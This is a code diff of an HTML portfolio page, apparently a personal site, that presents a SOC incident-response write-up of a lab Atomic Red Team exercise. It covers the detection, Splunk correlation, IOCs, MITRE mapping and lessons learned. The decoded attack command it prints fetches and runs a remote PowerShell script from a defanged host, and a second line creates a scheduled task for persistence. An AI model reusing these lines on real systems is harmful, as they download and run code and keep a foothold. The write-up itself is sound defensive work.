       <div class="metric-val">2m 15s</div>
       <div class="metric-label">Time to<br>Detection</div>
@@ -131,76 +320,57 @@ footer{text-align:center;padding:2rem 5%;font-family:'Fira Code',monospace;font-
     </div>
   </div>
 
-  <!-- EXECUTIVE SUMMARY -->
-  <div class="glass">
-    <div class="s-title"><span class="text-sky-400 font-mono text-xs">01.</span> Executive Summary</div>
-    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.8;margin-bottom:1rem;">
-      On December 10, 2024, my home Mini-SOC detected encoded PowerShell execution on a lab Windows host attempting to download a remote payload and establish persistence via a scheduled task. This writeup documents the full investigation: from initial Wazuh alert through log correlation, threat intelligence enrichment, host forensics, and containment.
-    </p>
+  <div class="glass glass-red">
+    <div class="s-title"><span class="s-num s-num-red">01.</span> Executive Summary</div>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.8;margin-bottom:1rem;">On December 10, 2024, my home Mini-SOC detected encoded PowerShell execution on a lab Windows host attempting to download a remote payload and establish persistence via a scheduled task. This writeup documents the full investigation: from initial Wazuh alert through log correlation, threat intelligence enrichment, host forensics, and containment.</p>
     <div class="alert-info">
       <strong style="font-family:'Fira Code',monospace;font-size:0.72rem;letter-spacing:0.05em;">NOTE —</strong>
-      <span style="font-size:0.83rem;"> This was a controlled exercise using <strong>Atomic Red Team</strong> against WIN-LAB-01. Production SOC procedures were followed throughout to validate the detection pipeline.</span>
+      <span style="font-size:0.83rem;"> Controlled exercise using <strong>Atomic Red Team</strong> against WIN-LAB-01. Production SOC procedures were followed throughout to validate the detection pipeline.</span>
     </div>
   </div>
 
-  <!-- INITIAL DETECTION -->
-  <div class="glass">
-    <div class="s-title"><span class="text-sky-400 font-mono text-xs">02.</span> Initial Detection</div>
-    <div class="alert-danger mb-4">
-      <div style="font-family:'Fira Code',monospace;font-size:0.7rem;letter-spacing:0.06em;margin-bottom:8px;opacity:0.8;">WAZUH ALERT — RULE 91816</div>
-      <table style="font-size:0.8rem;width:100%;border-collapse:collapse;">
-        <tr><td style="padding:3px 0;opacity:0.7;width:140px;">Severity</td><td style="color:#f87171;font-weight:600;">High — Level 12</td></tr>
-        <tr><td style="padding:3px 0;opacity:0.7;">Host</td><td>WIN-LAB-01 (192.168.1.150)</td></tr>
-        <tr><td style="padding:3px 0;opacity:0.7;">User</td><td>labuser</td></tr>
-        <tr><td style="padding:3px 0;opacity:0.7;">Timestamp</td><td>2024-12-10 14:23:17 EST</td></tr>
-        <tr><td style="padding:3px 0;opacity:0.7;">Description</td><td>PowerShell encoded command detected</td></tr>
-      </table>
+  <div class="glass glass-red">
+    <div class="s-title"><span class="s-num s-num-red">02.</span> Initial Detection</div>
+    <div class="alert-card mb-4">
+      <div class="alert-header">WAZUH ALERT — RULE 91816</div>
+      <div class="alert-row"><span class="alert-key">Severity</span><span class="alert-val critical">High — Level 12</span></div>
+      <div class="alert-row"><span class="alert-key">Host</span><span class="alert-val">WIN-LAB-01 (192.168.1.150)</span></div>
+      <div class="alert-row"><span class="alert-key">User</span><span class="alert-val">labuser</span></div>
+      <div class="alert-row"><span class="alert-key">Timestamp</span><span class="alert-val">2024-12-10 14:23:17 EST</span></div>
+      <div class="alert-row"><span class="alert-key">Description</span><span class="alert-val">PowerShell encoded command detected</span></div>
     </div>
-
-    <p style="font-size:0.85rem;color:var(--text-l);margin-bottom:0.75rem;">The raw command observed by Wazuh/Sysmon (Event ID 1):</p>
+    <p style="font-size:0.85rem;color:var(--text-l);margin-bottom:0.75rem;">Raw command observed by Wazuh/Sysmon (Event ID 1):</p>
     <pre>powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...</pre>
-
     <p style="font-size:0.85rem;color:var(--text-l);margin:0.75rem 0;">Base64 decoded:</p>
     <pre>IEX (New-Object Net.WebClient).DownloadString('http://malicious[.]com/stage2.ps1')
 schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update.ps1" /sc onlogon</pre>
-
-    <div class="alert-danger mt-4" style="font-size:0.83rem;line-height:1.7;">
-      <strong>Why this is critical:</strong> This command performs two distinct malicious actions in one execution —
-      (1) downloads a second-stage payload via <code style="font-family:'Fira Code',monospace;font-size:0.78em;">IEX + WebClient</code> (fileless execution, never touches disk as a script),
-      and (2) creates a <code style="font-family:'Fira Code',monospace;font-size:0.78em;">schtasks</code> persistence entry that survives reboots.
-      Base64 encoding is used specifically to evade string-based detection rules.
+    <div class="alert-box alert-danger mt-4" style="font-size:0.83rem;line-height:1.7;">
+      <strong>Why this is critical:</strong> Two distinct malicious actions in one execution — (1) fileless payload download via <code style="font-family:'Fira Code',monospace;font-size:0.82em;">IEX + WebClient</code>, never touching disk, and (2) <code style="font-family:'Fira Code',monospace;font-size:0.82em;">schtasks</code> persistence that survives reboots. Base64 encoding specifically evades string-based detection rules.
     </div>
   </div>
 
-  <!-- INVESTIGATION TIMELINE -->
   <div class="glass">
-    <div class="s-title"><span class="text-sky-400 font-mono text-xs">03.</span> Investigation Timeline</div>
+    <div class="s-title"><span class="s-num">03.</span> Investigation Timeline</div>
     <div class="timeline">
-
-      <div class="tl-item">
-        <div class="tl-time">T+0:00</div>
-        <div class="tl-title">Alert Received & Initial Triage</div>
-        <div class="tl-body">Wazuh Rule 91816 fired on WIN-LAB-01. Alert opened in Splunk. Command decoded manually from Base64 — immediately identified IEX download and schtasks persistence. Severity assessed as High. Investigation started.</div>
+      <div class="tl-item tl-item-threat">
+        <div class="tl-time-v">T+0:00</div>
+        <div class="tl-title-v">Alert Received &amp; Initial Triage</div>
+        <div class="tl-body-v">Wazuh Rule 91816 fired on WIN-LAB-01. Alert opened in Splunk. Command decoded manually from Base64 — immediately identified IEX download and schtasks persistence. Severity assessed as High. Investigation started.</div>
       </div>
-
       <div class="tl-item">
-        <div class="tl-time">T+0:05</div>
-        <div class="tl-title">Log Correlation — Multi-Source</div>
-        <div class="tl-body">
-          Splunk query across Wazuh, Suricata, and Windows event indexes:
+        <div class="tl-time-v">T+0:05</div>
+        <div class="tl-title-v">Log Correlation — Multi-Source</div>
+        <div class="tl-body-v">Splunk query across Wazuh, Suricata, and Windows event indexes. Findings: 3 additional PowerShell executions within 2-minute window. Suricata detected HTTP outbound to 185.220.101.42. Windows Event ID 4698 confirmed scheduled task creation.
           <pre style="margin-top:8px;">index=suricata OR index=wazuh host="WIN-LAB-01"
 | eval _time=strptime(timestamp, "%Y-%m-%dT%H:%M:%S")
 | sort _time
 | table _time, src_ip, dest_ip, dest_port, alert.signature, full_log</pre>
-          Findings: 3 additional PowerShell executions within 2-minute window. Suricata detected HTTP outbound to 185.220.101.42. Windows Event ID 4698 confirmed scheduled task creation.
         </div>
       </div>
-
       <div class="tl-item">
-        <div class="tl-time">T+0:12</div>
-        <div class="tl-title">Threat Intelligence Enrichment</div>
-        <div class="tl-body">
-          Ran C2 IP <code style="font-family:'Fira Code',monospace;font-size:0.85em;">185.220.101.42</code> through CyberOps Sidekick (Threat Intel Bot):
+        <div class="tl-time-v">T+0:12</div>
+        <div class="tl-title-v">Threat Intelligence Enrichment</div>
+        <div class="tl-body-v">Ran C2 IP <code style="font-family:'Fira Code',monospace;font-size:0.85em;">185.220.101.42</code> through CyberOps Sidekick:
           <ul class="bullet-list mt-2">
             <li>AbuseIPDB: <strong style="color:#f87171;">100/100</strong> confidence — 47 abuse reports</li>
             <li>VirusTotal: <strong style="color:#f87171;">8/92 engines</strong> flagged malicious</li>
@@ -209,12 +379,10 @@ schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update
           </ul>
         </div>
       </div>
-
       <div class="tl-item">
-        <div class="tl-time">T+0:25</div>
-        <div class="tl-title">Host Forensics</div>
-        <div class="tl-body">
-          Windows Event Log and Sysmon analysis:
+        <div class="tl-time-v">T+0:25</div>
+        <div class="tl-title-v">Host Forensics</div>
+        <div class="tl-body-v">Windows Event Log and Sysmon analysis:
           <ul class="bullet-list mt-2">
             <li>Event ID 4688: <code style="font-family:'Fira Code',monospace;font-size:0.85em;">powershell.exe</code> process creation (parent: <code style="font-family:'Fira Code',monospace;font-size:0.85em;">cmd.exe</code>)</li>
             <li>Sysmon Event ID 1: full command line captured including encoded payload</li>
@@ -223,11 +391,10 @@ schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update
           </ul>
         </div>
       </div>
-
       <div class="tl-item" style="padding-bottom:0;">
-        <div class="tl-time">T+0:42</div>
-        <div class="tl-title">Containment & Remediation</div>
-        <div class="tl-body">
+        <div class="tl-time-v">T+0:42</div>
+        <div class="tl-title-v">Containment &amp; Remediation</div>
+        <div class="tl-body-v">
           <ul class="bullet-list">
             <li>Host isolated from network via firewall egress block (DNS exception kept)</li>
             <li>Malicious <code style="font-family:'Fira Code',monospace;font-size:0.85em;">powershell.exe</code> (PID 4892) terminated</li>
@@ -237,61 +404,30 @@ schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update
           </ul>
         </div>
       </div>
-
     </div>
   </div>
 
-  <!-- IOCs -->
   <div class="glass">
-    <div class="s-title"><span class="text-sky-400 font-mono text-xs">04.</span> Indicators of Compromise</div>
+    <div class="s-title"><span class="s-num">04.</span> Indicators of Compromise</div>
     <div style="overflow-x:auto;">
       <table class="ioc-table">
         <thead>
-          <tr>
-            <th>Type</th>
-            <th>Value</th>
-            <th>Context</th>
-          </tr>
+          <tr><th>Type</th><th>Value</th><th>Context</th></tr>
         </thead>
         <tbody>
-          <tr>
-            <td><span class="tag tag-red" style="font-size:0.62rem;">IP</span></td>
-            <td>185.220.101.42</td>
-            <td>C2 server — 100/100 AbuseIPDB, 8/92 VT flags</td>
-          </tr>
-          <tr>
-            <td><span class="tag tag-red" style="font-size:0.62rem;">DOMAIN</span></td>
-            <td>malicious[.]com</td>
-            <td>Stage-2 payload host — 3 days old at time of incident</td>
-          </tr>
-          <tr>
-            <td><span class="tag tag-red" style="font-size:0.62rem;">FILE</span></td>
-            <td>C:\Users\Public\update.ps1</td>
-            <td>Dropped stage-2 payload script</td>
-          </tr>
-          <tr>
-            <td><span class="tag tag-red" style="font-size:0.62rem;">PROCESS</span></td>
-            <td>powershell.exe (PID 4892)</td>
-            <td>Malicious execution — parent cmd.exe</td>
-          </tr>
-          <tr>
-            <td><span class="tag tag-red" style="font-size:0.62rem;">TASK</span></td>
-            <td>SystemUpdate</td>
-            <td>Persistence — triggers on user logon</td>
-          </tr>
-          <tr>
-            <td><span class="tag" style="font-size:0.62rem;">HASH</span></td>
-            <td>SQBFAFgAIAAo... (B64)</td>
-            <td>Encoded command payload</td>
-          </tr>
+          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">IP</span></td><td>185.220.101.42</td><td>C2 server — 100/100 AbuseIPDB, 8/92 VT flags</td></tr>
+          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">DOMAIN</span></td><td>malicious[.]com</td><td>Stage-2 payload host — 3 days old at time of incident</td></tr>
+          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">FILE</span></td><td>C:\Users\Public\update.ps1</td><td>Dropped stage-2 payload script</td></tr>
+          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">PROCESS</span></td><td>powershell.exe (PID 4892)</td><td>Malicious execution — parent cmd.exe</td></tr>
+          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">TASK</span></td><td>SystemUpdate</td><td>Persistence — triggers on user logon</td></tr>
+          <tr><td><span class="tag" style="font-size:0.62rem;">HASH</span></td><td>SQBFAFgAIAAo... (B64)</td><td>Encoded command payload</td></tr>
         </tbody>
       </table>
     </div>
   </div>
 
-  <!-- MITRE -->
   <div class="glass">
-    <div class="s-title"><span class="text-sky-400 font-mono text-xs">05.</span> MITRE ATT&CK Mapping</div>
+    <div class="s-title"><span class="s-num">05.</span> MITRE ATT&amp;CK Mapping</div>
     <div class="mitre-grid">
       <div class="mitre-card">
         <div class="mitre-id">T1059.001</div>
@@ -314,17 +450,15 @@ schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update
       <div class="mitre-card">
         <div class="mitre-id">T1105</div>
         <div class="mitre-name">Ingress Tool Transfer</div>
-        <div class="mitre-tactic">Tactic: Command & Control</div>
+        <div class="mitre-tactic">Tactic: Command &amp; Control</div>
         <div class="mitre-desc">HTTP GET to 185.220.101.42 attempted to download stage-2 payload (stage2.ps1) from attacker-controlled infrastructure.</div>
       </div>
     </div>
   </div>
 
-  <!-- LESSONS LEARNED -->
   <div class="glass">
-    <div class="s-title"><span class="text-sky-400 font-mono text-xs">06.</span> Lessons Learned</div>
-
-    <div class="alert-success mb-4">
+    <div class="s-title"><span class="s-num">06.</span> Lessons Learned</div>
+    <div class="alert-box alert-success mb-4">
       <div style="font-family:'Fira Code',monospace;font-size:0.68rem;letter-spacing:0.08em;margin-bottom:8px;opacity:0.7;">WHAT WORKED</div>
       <ul class="bullet-list" style="color:#86efac;">
         <li>Wazuh detected the encoded command within seconds of execution</li>
@@ -333,8 +467,7 @@ schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update
         <li>Forensic evidence collected before containment — proper chain of custody</li>
       </ul>
     </div>
-
-    <div class="alert-warning mb-4">
+    <div class="alert-box alert-warning mb-4">
       <div style="font-family:'Fira Code',monospace;font-size:0.68rem;letter-spacing:0.08em;margin-bottom:8px;opacity:0.7;">GAPS IDENTIFIED</div>
       <ul class="bullet-list" style="color:#fde68a;">
         <li>Base64 decoding was done manually — 5-minute delay that should be automated</li>
@@ -342,8 +475,7 @@ schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update
         <li>Manual network isolation took 15+ minutes — SOAR integration would cut this to seconds</li>
       </ul>
     </div>
-
-    <div class="alert-success">
+    <div class="alert-box alert-success">
       <div style="font-family:'Fira Code',monospace;font-size:0.68rem;letter-spacing:0.08em;margin-bottom:8px;opacity:0.7;">IMPROVEMENTS IMPLEMENTED</div>
       <ul class="bullet-list" style="color:#86efac;">
         <li>Splunk alert now auto-decodes Base64 PowerShell commands and appends decoded content to alert</li>
@@ -354,26 +486,20 @@ schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update
     </div>
   </div>
 
-  <!-- CONCLUSION -->
   <div class="glass">
-    <div class="s-title"><span class="text-sky-400 font-mono text-xs">07.</span> Conclusion</div>
-    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1rem;">
-      Context is everything in SOC work. The initial Wazuh alert was a single line in the logs. By correlating data across three independent sources — HIDS, network IDS, and Windows event logs — and enriching with external threat intelligence, I was able to reconstruct the complete attack chain: initial execution → obfuscation → C2 callback attempt → persistence establishment.
-    </p>
-    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;">
-      Detection to containment in 42 minutes on a solo analyst workflow. The gaps identified (manual decoding, no playbook, slow isolation) are exactly the kind of friction that SOAR tooling is designed to eliminate. This investigation directly informed automation improvements to the lab pipeline.
-    </p>
+    <div class="s-title"><span class="s-num">07.</span> Conclusion</div>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1rem;">Context is everything in SOC work. The initial Wazuh alert was a single line in the logs. By correlating data across three independent sources — HIDS, network IDS, and Windows event logs — and enriching with external threat intelligence, I was able to reconstruct the complete attack chain: initial execution → obfuscation → C2 callback attempt → persistence establishment.</p>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;">Detection to containment in 42 minutes on a solo analyst workflow. The gaps identified (manual decoding, no playbook, slow isolation) are exactly the kind of friction that SOAR tooling is designed to eliminate. This investigation directly informed automation improvements to the lab pipeline.</p>
   </div>
 
-  <!-- SKILLS -->
   <div class="glass">
-    <div class="s-title"><span class="text-sky-400 font-mono text-xs">08.</span> Skills Demonstrated</div>
-    <div class="flex flex-wrap gap-2">
+    <div class="s-title"><span class="s-num">08.</span> Skills Demonstrated</div>
+    <div style="display:flex;flex-wrap:wrap;gap:0.5rem;">
       <span class="tag">Alert Triage</span>
       <span class="tag">Log Correlation</span>
       <span class="tag">Base64 Decoding</span>
       <span class="tag">Threat Intelligence</span>
-      <span class="tag">MITRE ATT&CK</span>
+      <span class="tag">MITRE ATT&amp;CK</span>
       <span class="tag">Splunk SPL</span>
       <span class="tag">Wazuh HIDS</span>
       <span class="tag">Suricata IDS</span>
@@ -384,11 +510,8 @@ schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update
     </div>
   </div>
 
-  <!-- CTA -->
-  <div class="text-center mt-10">
-    <a href="../index.html#projects" style="font-family:'Fira Code',monospace;font-size:0.75rem;letter-spacing:0.08em;padding:10px 28px;border:1px solid rgba(79,195,247,0.35);color:var(--sky);border-radius:8px;transition:all 0.3s ease;display:inline-block;text-decoration:none;" onmouseover="this.style.background='rgba(79,195,247,0.07)'" onmouseout="this.style.background='transparent'">
-      ← Back to Projects
-    </a>
+  <div style="text-align:center;margin-top:2.5rem;">
+    <a href="../index.html#projects" class="btn-outline">← Back to Projects</a>
   </div>
 
 </main>
@@ -397,74 +520,168 @@ schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update
   <p>Abdelkrim Zouaki · <a href="https://github.com/karim871" style="color:inherit;text-decoration:none;">karim871</a> · Montreal, QC</p>
 </footer>
 
+<script src="https://cdn.jsdelivr.net/npm/@studio-freight/lenis@1.0.42/dist/lenis.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrollTrigger.min.js"></script>
 <script>
-// Progress bar
+// LENIS
+const lenis = new Lenis({ lerp: 0.08, smoothWheel: true });
+lenis.on('scroll', ScrollTrigger.update);
+gsap.ticker.add((time) => { lenis.raf(time * 1000); });
+gsap.ticker.lagSmoothing(0);
+
+// PROGRESS BAR
 const progressBar = document.getElementById('progress-bar');
 window.addEventListener('scroll', () => {
   const pct = window.scrollY / (document.documentElement.scrollHeight - window.innerHeight) * 100;
   progressBar.style.width = Math.min(pct, 100) + '%';
 }, { passive: true });
 
-// Starry Night (lighter variant — 350 particles, no silhouette)
-(function() {
-  const canvas = document.getElementById('starry-night-canvas');
-  const ctx = canvas.getContext('2d');
-  const VORTICES = [
-    {nx:.22,ny:.24,str:1.6,r:.34,cw:1},{nx:.52,ny:.14,str:1.2,r:.28,cw:-1},
-    {nx:.76,ny:.27,str:1.0,r:.24,cw:1},{nx:.36,ny:.44,str:.8,r:.40,cw:-1},
-  ];
-  const BLUES = ['#0a1628','#0d1f3c','#122348','#1a3a6b','#1e4480','#1b5e7b','#1d6a8a','#205070','#163858','#17325a','#1c4060','#244870'];
-  function flow(x,y,t) {
-    const nx=x/canvas.width, ny=y/canvas.height;
-    let vx=.28,vy=0;
-    for(const v of VORTICES) {
-      const dx=nx-v.nx,dy=ny-v.ny,d2=dx*dx+dy*dy;
-      if(d2<v.r*v.r&&d2>1e-6){const inf=(1-Math.sqrt(d2)/v.r)*v.str,ang=Math.atan2(dy,dx)+v.cw*Math.PI/2;vx+=Math.cos(ang)*inf;vy+=Math.sin(ang)*inf;}
-    }
-    vx+=Math.sin(ny*6.5+t*.11)*.24; vy+=Math.cos(nx*6.5+t*.09)*.20;
-    return {vx,vy};
-  }
-  let stars=[];
-  function buildStars() {
-    stars=[];
-    const n=Math.max(10,Math.floor(canvas.width*canvas.height/22000));
-    for(let i=0;i<n;i++){const lg=Math.random()<.14;stars.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height*.78,r:lg?4+Math.random()*5:.9+Math.random()*2.2,phase:Math.random()*Math.PI*2,freq:.007+Math.random()*.016,halo:lg?12+Math.random()*14:4+Math.random()*8,rays:lg});}
-  }
-  const N=350; let strokes=[];
-  function rst(s){s.x=Math.random()*canvas.width;s.y=Math.random()*canvas.height;s.age=Math.random()*160;s.maxAge=160+Math.random()*260;s.speed=.8+Math.random()*1.7;s.width=1.5+Math.random()*5.5;s.color=BLUES[Math.floor(Math.random()*BLUES.length)];s.opacity=.30+Math.random()*.62;return s;}
-  function buildStrokes(){strokes=[];for(let i=0;i<N;i++)rst(strokes[i]={});}
-  function drawSky(){
-    const g=ctx.createLinearGradient(0,0,canvas.width*.55,canvas.height);
-    g.addColorStop(0,'#03060d');g.addColorStop(.35,'#081428');g.addColorStop(.75,'#0d1e3c');g.addColorStop(1,'#0a1425');
-    ctx.fillStyle=g;ctx.fillRect(0,0,canvas.width,canvas.height);
-  }
-  function drawMoon(t){
-    const mx=canvas.width*.83,my=canvas.height*.11,p=Math.sin(t*.006)*.08;
-    const cor=ctx.createRadialGradient(mx,my,0,mx,my,130*(1+p));cor.addColorStop(0,'rgba(249,168,37,.12)');cor.addColorStop(1,'transparent');
-    ctx.fillStyle=cor;ctx.beginPath();ctx.arc(mx,my,130*(1+p),0,Math.PI*2);ctx.fill();
-    const hal=ctx.createRadialGradient(mx,my,0,mx,my,56*(1+p));hal.addColorStop(0,'#fffde7');hal.addColorStop(.6,'rgba(249,168,37,.55)');hal.addColorStop(1,'transparent');
-    ctx.fillStyle=hal;ctx.beginPath();ctx.arc(mx,my,56*(1+p),0,Math.PI*2);ctx.fill();
-    ctx.fillStyle='#fffde7';ctx.beginPath();ctx.arc(mx,my,22,0,Math.PI*2);ctx.fill();
-  }
-  function drawStar(s,t){
-    const p=Math.sin(t*s.freq+s.phase),gw=s.r*(1+p*.32),hr=s.halo*(1+p*.22);
-    const og=ctx.createRadialGradient(s.x,s.y,0,s.x,s.y,hr*4);og.addColorStop(0,'rgba(249,168,37,'+(0.32+p*.10)+')');og.addColorStop(1,'transparent');
-    ctx.fillStyle=og;ctx.beginPath();ctx.arc(s.x,s.y,hr*4,0,Math.PI*2);ctx.fill();
-    const ig=ctx.createRadialGradient(s.x,s.y,0,s.x,s.y,hr);ig.addColorStop(0,'#fffde7');ig.addColorStop(1,'transparent');
-    ctx.fillStyle=ig;ctx.beginPath();ctx.arc(s.x,s.y,hr,0,Math.PI*2);ctx.fill();
-    ctx.fillStyle='#fffde7';ctx.beginPath();ctx.arc(s.x,s.y,gw,0,Math.PI*2);ctx.fill();
-    if(s.rays){const rl=hr*3*(1+p*.12);ctx.save();ctx.translate(s.x,s.y);ctx.rotate(t*.004);for(let k=0;k<4;k++){const a=k*Math.PI/2;const gr=ctx.createLinearGradient(0,0,Math.cos(a)*rl,Math.sin(a)*rl);gr.addColorStop(0,'rgba(255,253,231,.18)');gr.addColorStop(1,'transparent');ctx.strokeStyle=gr;ctx.lineWidth=.7;ctx.beginPath();ctx.moveTo(0,0);ctx.lineTo(Math.cos(a)*rl,Math.sin(a)*rl);ctx.stroke();}ctx.restore();}
-  }
-  function drawStrokes(t){
-    ctx.save();ctx.globalCompositeOperation='screen';ctx.lineCap='round';
-    for(let i=0;i<strokes.length;i++){const s=strokes[i];s.age++;if(s.age>s.maxAge){rst(s);continue;}const{vx,vy}=flow(s.x,s.y,t);const nx=s.x+vx*s.speed,ny=s.y+vy*s.speed;const lf=s.age/s.maxAge;const al=(lf<.08?lf/.08:lf>.88?(1-lf)/.12:1)*s.opacity*.55;if(al>.006){ctx.globalAlpha=al;ctx.strokeStyle=s.color;ctx.lineWidth=s.width;ctx.beginPath();ctx.moveTo(s.x,s.y);ctx.lineTo(nx,ny);ctx.stroke();}s.x=nx;s.y=ny;if(s.x<-20)s.x=canvas.width+20;if(s.x>canvas.width+20)s.x=-20;if(s.y<-20)s.y=canvas.height+20;if(s.y>canvas.height+20)s.y=-20;}
-    ctx.globalAlpha=1;ctx.globalCompositeOperation='source-over';ctx.restore();
-  }
-  let t=0;
-  function resize(){canvas.width=window.innerWidth;canvas.height=window.innerHeight;buildStars();buildStrokes();}
-  function frame(){drawSky();drawStrokes(t);for(const s of stars)drawStar(s,t);drawMoon(t);t+=.5;requestAnimationFrame(frame);}
-  resize();window.addEventListener('resize',resize,{passive:true});requestAnimationFrame(frame);
+// CURSOR
+const dot = document.getElementById('cursor-dot');
+const ring = document.getElementById('cursor-ring');
+let mx = 0, my = 0, rx = 0, ry = 0;
+document.addEventListener('mousemove', (e) => { mx = e.clientX; my = e.clientY; });
+(function animCursor() {
+  rx += (mx - rx) * 0.13; ry += (my - ry) * 0.13;
+  dot.style.left = mx + 'px'; dot.style.top = my + 'px';
+  ring.style.left = rx + 'px'; ring.style.top = ry + 'px';
+  requestAnimationFrame(animCursor);
 })();
+document.querySelectorAll('a,button,.metric-card,.mitre-card,.tl-card').forEach(el => {
+  el.addEventListener('mouseenter', () => {
+    dot.style.transform = 'translate(-50%,-50%) scale(2.5)';
+    ring.style.width = '56px'; ring.style.height = '56px';
+    ring.style.borderColor = 'rgba(0,255,136,0.9)';
+  });
+  el.addEventListener('mouseleave', () => {
+    dot.style.transform = 'translate(-50%,-50%) scale(1)';
+    ring.style.width = '36px'; ring.style.height = '36px';
+    ring.style.borderColor = 'rgba(0,255,136,0.5)';
+  });
+});
+
+// CURSOR TRAIL
+const tc = document.getElementById('cursor-canvas');
+const tctx = tc.getContext('2d');
+let pts = [];
+function resizeTC() { tc.width = window.innerWidth; tc.height = window.innerHeight; }
+resizeTC(); window.addEventListener('resize', resizeTC);
+document.addEventListener('mousemove', (e) => {
+  pts.push({ x: e.clientX, y: e.clientY, age: 0, life: 25 + Math.random() * 15 });
+  if (pts.length > 60) pts.shift();
+});
+(function drawTrail() {
+  tctx.clearRect(0, 0, tc.width, tc.height);
+  pts = pts.filter(p => p.age < p.life);
+  for (const p of pts) {
+    const a = (1 - p.age / p.life) * 0.5;
+    const r = (1 - p.age / p.life) * 2.2;
+    tctx.beginPath(); tctx.arc(p.x, p.y, r, 0, Math.PI * 2);
+    tctx.fillStyle = `rgba(0,255,136,${a})`; tctx.fill();
+    p.age++;
+  }
+  requestAnimationFrame(drawTrail);
+})();
+
+// GSAP
+gsap.registerPlugin(ScrollTrigger);
+
+// HERO SPLIT
+function splitWords(el) {
+  const words = el.textContent.trim().split(/\s+/);
+  el.innerHTML = words.map(w => `<span class="word-w"><span class="word-i">${w}</span></span>`).join(' ');
+}
+['hl1','hl2','hl3'].forEach(id => {
+  const el = document.getElementById(id);
+  if (el) splitWords(el);
+});
+gsap.from('.word-i', { y: '115%', duration: 1.1, ease: 'power4.out', stagger: 0.055, delay: 0.1 });
+gsap.from('.hero-eyebrow', { opacity: 0, y: 14, duration: 0.9, ease: 'power3.out', delay: 0.05 });
+gsap.from('.threat-badge', { opacity: 0, x: -20, duration: 0.8, ease: 'power3.out', delay: 0.0 });
+gsap.from('.hero-tags', { opacity: 0, y: 10, duration: 0.8, ease: 'power3.out', delay: 0.3 });
+gsap.from('.hero-sub', { opacity: 0, y: 16, duration: 0.9, ease: 'power3.out', delay: 0.7 });
+gsap.from('.hero-meta', { opacity: 0, y: 10, duration: 0.8, ease: 'power3.out', delay: 0.85 });
+gsap.from('.hero-stats-strip > div', { opacity: 0, y: 20, duration: 0.7, ease: 'power3.out', stagger: 0.12, delay: 1.0 });
+
+// HERO SCRUB
+gsap.to('.hero-inner', {
+  y: 90, ease: 'none',
+  scrollTrigger: { trigger: '#hero', start: 'top top', end: 'bottom top', scrub: 1.2 }
+});
+gsap.to('.hero-inner', {
+  opacity: 0, ease: 'none',
+  scrollTrigger: { trigger: '#hero', start: '45% top', end: 'bottom top', scrub: 1 }
+});
+
+// ============================================================
+// HORIZONTAL TIMELINE
+// ============================================================
+const tlTrack = document.getElementById('tl-track');
+const tlPin = document.getElementById('tl-pin-section');
+const tlProg = document.getElementById('tl-prog');
+const threatCard = document.getElementById('tl-card-0');
+
+// Make sure we calculate after render
+ScrollTrigger.addEventListener('refresh', () => {});
+
+const tlAnim = gsap.to(tlTrack, {
+  x: () => -(tlTrack.scrollWidth - window.innerWidth),
+  ease: 'none',
+  scrollTrigger: {
+    trigger: tlPin,
+    pin: true,
+    start: 'top top',
+    end: () => `+=${tlTrack.scrollWidth - window.innerWidth + 200}`,
+    scrub: 1,
+    invalidateOnRefresh: true,
+    onUpdate: (self) => {
+      tlProg.style.width = (self.progress * 100) + '%';
+      // Activate red pulse when threat card is prominent (first 30% of scroll)
+      if (self.progress < 0.3) {
+        threatCard.classList.add('active');
+      } else {
+        threatCard.classList.remove('active');
+      }
+    },
+    onEnter: () => { threatCard.classList.add('active'); },
+  }
+});
+
+// SECTION ANIMATIONS
+gsap.from('.metric-card', {
+  y: 30, opacity: 0, duration: 0.7, ease: 'power3.out', stagger: 0.1,
+  scrollTrigger: { trigger: '#metrics', start: 'top 88%', once: true }
+});
+gsap.utils.toArray('.glass').forEach(el => {
+  gsap.from(el, {
+    y: 36, opacity: 0, duration: 0.8, ease: 'power3.out',
+    scrollTrigger: { trigger: el, start: 'top 90%', once: true }
+  });
+});
+gsap.utils.toArray('.mitre-card').forEach((card, i) => {
+  gsap.from(card, {
+    y: 20, opacity: 0, duration: 0.6, ease: 'power3.out',
+    scrollTrigger: { trigger: card, start: 'top 92%', once: true }
+  });
+});
+gsap.utils.toArray('.tl-item').forEach(item => {
+  gsap.from(item, {
+    x: -18, opacity: 0, duration: 0.65, ease: 'power3.out',
+    scrollTrigger: { trigger: item, start: 'top 91%', once: true }
+  });
+});
+
+// MAGNETIC BUTTON
+document.querySelectorAll('.btn-outline').forEach(btn => {
+  btn.addEventListener('mousemove', (e) => {
+    const r = btn.getBoundingClientRect();
+    gsap.to(btn, { x: (e.clientX - r.left - r.width/2)*0.28, y: (e.clientY - r.top - r.height/2)*0.28, duration: 0.35, ease: 'power2.out' });
+  });
+  btn.addEventListener('mouseleave', () => {
+    gsap.to(btn, { x: 0, y: 0, duration: 0.6, ease: 'elastic.out(1,0.5)' });
+  });
+});
 </script>
 </body>
 </html>
